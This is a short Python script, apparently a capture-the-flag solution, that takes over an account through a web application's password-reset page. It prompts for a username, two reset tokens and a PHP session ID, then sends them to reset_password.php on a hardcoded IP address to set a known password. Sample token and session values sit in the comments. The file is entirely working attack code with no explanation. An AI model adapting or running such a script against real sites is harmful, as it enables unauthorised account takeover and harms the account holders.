import requests

name = input("name: ")  # 61ef6b99
token1 = input("token1: ")  # 1842726054
token2 = input("token2: ")  # 1401359843
session = input("PHP session: ")  # 2ab7a54a6d039699498291e26a3627f6
email = f"{name}@firebird.sh"
password = "firebirdie"

with requests.get(
    "http://20.55.48.101/reset_password.php",
    cookies={
        "PHPSESSID": session,
    },
    params={
        "email": email,
        "new_password": password,
        "token1": token1,
        "token2": token2,
    },
) as req:
    print(req.content)
